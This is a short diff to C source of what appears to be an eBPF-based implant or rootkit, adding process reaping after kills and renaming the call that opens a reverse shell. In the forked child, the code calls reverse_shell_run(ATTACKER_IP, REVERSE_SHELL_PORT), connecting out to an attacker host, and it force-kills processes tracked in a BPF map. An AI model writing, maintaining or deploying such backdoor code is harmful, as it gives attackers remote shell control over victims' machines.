@@ -4,6 +4,7 @@
 #include <signal.h>
 #include <stdint.h>
 #include <stdlib.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
 #include "config.h"
@@ -27,8 +28,10 @@ static void kill_all_tracked_pids(int tracked_pids_map_fd) {
     while (ret == 0) {
         pid = next_pid;
 
-        if (pid != getpid())
+        if (pid != getpid()) {
             kill(pid, SIGKILL);
+            waitpid(pid, NULL, 0);
+        }
 
         ret = bpf_map_get_next_key(tracked_pids_map_fd, &pid, &next_pid);
     }
@@ -45,6 +48,8 @@ static void remove_reverse_shell(command_processor_context_t *command_processor_
 
     if (*(command_processor_ctx->reverse_shell_pid) > 0) {
         kill(*(command_processor_ctx->reverse_shell_pid), SIGKILL);
+        waitpid(*(command_processor_ctx->reverse_shell_pid), NULL, 0);
+
         *(command_processor_ctx->reverse_shell_pid) = -1;
     }
 }
@@ -96,7 +101,7 @@ static int spawn_reverse_shell(command_processor_context_t *command_processor_ct
     }
 
     if (pid == 0) {
-        reverse_shell_start(ATTACKER_IP, REVERSE_SHELL_PORT);
+        reverse_shell_run(ATTACKER_IP, REVERSE_SHELL_PORT);
         _exit(EXIT_FAILURE);
     }
 
